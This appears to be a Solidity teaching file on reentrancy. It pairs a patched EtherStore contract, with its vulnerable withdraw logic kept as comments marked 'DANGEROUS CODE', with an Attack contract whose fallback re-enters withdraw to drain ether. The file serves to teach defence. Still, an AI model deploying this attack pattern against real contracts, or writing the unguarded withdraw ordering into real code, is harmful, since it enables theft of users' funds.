// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

/*
Reentrancy

- What is reentrancy?
- Remix code and demo
- Preventative techniques
*/

contract EtherStore {
    mapping(address => uint256) public balances;

    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public noReentrant {
        // DANGEROUS CODE
        // require(balances[msg.sender] >= _amount);

        // (bool sent, ) = msg.sender.call{value: _amount}("");
        // require(sent, "Failed to send Ether");

        // balances[msg.sender] -= _amount;

        // PREVENTION CODE
        require(balances[msg.sender] >= _amount);

        balances[msg.sender] -= _amount;

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        // // 0.5
        // etherStore.deposit.value(1 ether)();
        // // 0.6
        // etherStore.deposit{value: 1 ether}();
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
